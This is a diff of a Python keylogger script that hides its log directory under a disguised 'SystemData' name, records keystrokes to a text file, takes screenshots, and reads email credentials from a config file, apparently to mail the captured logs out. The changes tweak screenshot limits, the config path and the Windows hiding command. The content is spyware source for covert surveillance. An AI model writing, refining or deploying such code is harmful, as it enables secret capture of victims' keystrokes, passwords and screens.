@@ -21,12 +21,14 @@ import json
 
 # maximum file size in MB to be read
 MAXFILESIZE = 5 * 1024
+# maximum screenshots per email
+MAXSCREENSHOTS = 5
 
 logPath = os.path.join(os.environ["LOCALAPPDATA"], "SystemData", "InputLogs")
 # makes and hides the directory by making is hidden and system file
 os.makedirs(logPath, exist_ok=True)
 if platform.system() == "Windows":
-    os.system(f'attrib +h +s "{logPath}"')
+    os.system(f'attrib -h -s "{logPath}"')
 elif platform.system() in ["Linux", "Darwin"]:
     hidden_file_path = os.path.join(os.path.dirname(logPath), "." + os.path.basename(logPath))
     os.rename(logPath, hidden_file_path)
@@ -34,7 +36,8 @@ elif platform.system() in ["Linux", "Darwin"]:
 # set file name of txt file to store the logged keys
 FILENAME = logPath + r"\log.txt"
 # setting email variables from config file
-with open("config.json") as config_file:
+config_file_path = os.path.join(os.path.dirname(__file__), "config.json")
+with open(config_file_path) as config_file:
     config = json.load(config_file)
 from_email = config["email"]
 password_email = config["email_pass"]
@@ -42,7 +45,6 @@ password_email = config["email_pass"]
 # makes the directory for the screenshots
 screenshotPath = os.path.join(logPath, "Temp")
 os.makedirs(screenshotPath, exist_ok=True)
-MAXSCREENSHOTS = 10
 
 def remove_files_in_directory(directory):
     for file in os.listdir(directory):
